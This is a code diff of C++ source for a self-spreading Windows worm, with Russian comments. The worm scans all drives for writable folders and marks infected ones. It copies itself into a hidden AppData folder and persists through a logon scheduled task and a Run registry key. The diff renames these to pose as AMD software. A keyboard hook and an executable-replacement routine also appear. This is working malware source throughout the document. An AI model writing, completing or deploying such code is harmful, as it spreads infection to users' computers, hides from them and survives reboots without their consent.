@@ -244,28 +244,94 @@ void worm::scan_all_volumes()  // поиск по всем корневым ди
 
 }
 
-void worm::search_list_dir(const wstring& path_to_dir, vector<wstring>& list_dir_tmp)// рекурсивный поиск всех подпапок по адрессу и внутри и копирование в выбранный вектор
+bool worm::possible_to_write(const std::wstring& dir_path) {
+    // Путь к тестовому файлу (например, создадим временный "test.txt")
+    std::wstring test_file = dir_path + L"\\test.tmp";
+
+    HANDLE hFile = CreateFileW(
+        test_file.c_str(),        // полный путь
+        GENERIC_WRITE,            // права на запись
+        0,                        // без шаринга
+        NULL,                     // защиты нет
+        CREATE_ALWAYS,            // создаём всегда (перезапишем если есть)
+        FILE_ATTRIBUTE_NORMAL,    // обычный файл
+        NULL
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return false; // не удалось создать
+    }
+
+    CloseHandle(hFile);
+    DeleteFileW(test_file.c_str()); // удалим тестовый файл
+    
+    return true; // запись возможна
+}
+
+bool worm::is_system_path(const std::wstring& path)
 {
+    wchar_t windowsDir[MAX_PATH];
+    wchar_t systemDir[MAX_PATH];
+
+    // Получаем путь к Windows и System32
+    GetWindowsDirectoryW(windowsDir, MAX_PATH);
+    GetSystemDirectoryW(systemDir, MAX_PATH);
+
+    // Строим список запрещённых директорий
+    std::vector<std::wstring> forbidden = {
+        std::wstring(windowsDir),                       // \Windows
+        std::wstring(systemDir),                        // \Windows\System32
+        std::wstring(windowsDir) + L"\\WinSxS",
+        std::wstring(windowsDir) + L"\\servicing",
+        std::wstring(windowsDir) + L"\\Logs",
+        std::wstring(windowsDir) + L"\\Temp",
+        L"\\Program Files",
+        L"\\Program Files (x86)",
+        L"\\ProgramData",
+        L"\\$Recycle.Bin",
+        L"\\System Volume Information",
+        L"\\Recovery",
+        L"\\PerfLogs"
+    };
+
+    // Проверяем совпадение (начинается с запрещённого пути)
+    for (const auto& bad : forbidden) {
+        if (path.size() >= bad.size() &&
+            _wcsnicmp(path.c_str(), bad.c_str(), bad.size()) == 0) {
+            wcout << L"нашли системную папку и не берем ее " << path << endl;
+            return true;
+        }
+    }
+
+    return false;
+}
+
+void worm::search_list_dir(const wstring& path_to_dir, vector<wstring>& list_dir_tmp)
+{
+    if (is_system_path(path_to_dir)) {
+        return; // пропускаем системную папку сразу
+    }
 
     error_code ec;
-
     fs::directory_iterator it(path_to_dir, ec);
     if (ec) {
         wcerr << L"Ошибка доступа к " << path_to_dir << L": " << ec.message().c_str() << L"\n";
         return;
     }
 
+    // Добавляем текущую папку, если можно записывать
+    if (possible_to_write(path_to_dir)) {
+        list_dir_tmp.push_back(path_to_dir);
+    }
+
     for (const auto& entry : it) {
         if (entry.is_directory(ec) && !ec && !is_hidden(entry.path())) {
-            std::wstring dir_path = entry.path().wstring();
-            list_dir_tmp.push_back(dir_path);
-            search_list_dir(dir_path, list_dir_tmp);  // рекурсия
+            search_list_dir(entry.path().wstring(), list_dir_tmp);  // рекурсия
         }
     }
-    list_dir_tmp.push_back(path_to_dir);
-
-
 }
+
+
 
 void worm::search_list_dir() // для старта поиска по дирректориям
 {
@@ -297,8 +363,11 @@ void worm::collect_visible_files(const vector<wstring>& list_dir_tmp, vector<fs:
         wcerr << L"[!] Список директорий пуст! Сначала вызовите search_list_dir()\n";
         return;
     }
+    wcout<<endl << L"Список всех директорий на обработку" << endl<<endl;
+    
 
     for (const auto& dir : list_dir_tmp) {
+        
         std::error_code dir_ec;
         fs::directory_iterator it(dir, dir_ec);
 
@@ -388,36 +457,34 @@ void worm::copy_and_hide_worm()
 
     wchar_t appdata_path[MAX_PATH];
     SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata_path);  // %APPDATA%
-
-    std::wstring dest_folder = std::wstring(appdata_path) + L"\\Microsoft\\Update"; // название скрытой папки куда будет скопирован червь
-    std::wstring dest_exe = dest_folder + L"\\update.exe"; // название самого червя, которые будет добавляться в таск манагер винды 10
-
-    // Создать директорию
+    std::wstring dest_folder = std::wstring(appdata_path) + L"\\Microsoft\\Update";
+    std::wstring dest_exe = dest_folder + L"\\update.exe";
+    // Создать директорию (если её нет)
     fs::create_directories(dest_folder);
-
+    // Удаляем старый файл, если существует
+    if (fs::exists(dest_exe)) {
+        fs::remove(dest_exe);
+    }
     // Копировать себя
     CopyFileW(own_path, dest_exe.c_str(), FALSE);
-
-    // Скрыть папку
     SetFileAttributesW(dest_folder.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-
-    // Скрыть файл
     SetFileAttributesW(dest_exe.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-
     std::wcout << L"Файл червя скопирован в: " << dest_exe << std::endl;
+    // Создать автозапуск
+    create_scheduled_task(dest_exe);
 }
+
 
 void worm::create_scheduled_task(const wstring& worm_path)
 {
-    // wstring worm_path = get_own_path();
-    std::wstring cmd = L"schtasks /create /tn \"MicrosoftUpdate\" "
+    //wstring worm_path = get_own_path();
+    std::wstring cmd = L"schtasks /create /tn \"AMDUpdateLoader\" "
         L"/tr \"" + worm_path + L"\" "
-        L"/sc ONLOGON /RL HIGHEST /F /RU \"" + get_username() + L"\"";
+        L"/sc ONLOGON /RL LIMITED /F";
     _wsystem(cmd.c_str());
-
     HKEY hKey;
     const std::wstring subkey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-    const std::wstring value_name = L"MicrosoftUpdate";  // Название ключа
+    const std::wstring value_name = L"AMDapp";  // Название ключа
 
     // Открываем раздел реестра
     if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
@@ -496,6 +563,8 @@ void worm::hide_and_replace_exe(const fs::path& target_exe, const std::wstring& 
 
 
 
+
+
 bool worm::infected_dir(const wstring& dir_path)
 {
     wstring full_name_to_file = dir_path + L"\\.infected";
@@ -513,6 +582,7 @@ bool worm::dir_was_infected(const wstring& dir_path)
     wstring full_name_to_file = dir_path + L"\\.infected";
     return fs::exists(full_name_to_file);
 }
+
 
 
 worm* worm::instance = nullptr;
@@ -621,7 +691,7 @@ void attach_console() {
 
 HHOOK worm::keyboardHook = nullptr; // Для считывания горячей клваиши по завершению мониторинга флешек (отладочный метод)
 
-LRESULT CALLBACK worm::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+LRESULT CALLBACK worm::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { // Клавиша для завершения мониторинга флешек
     if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
 
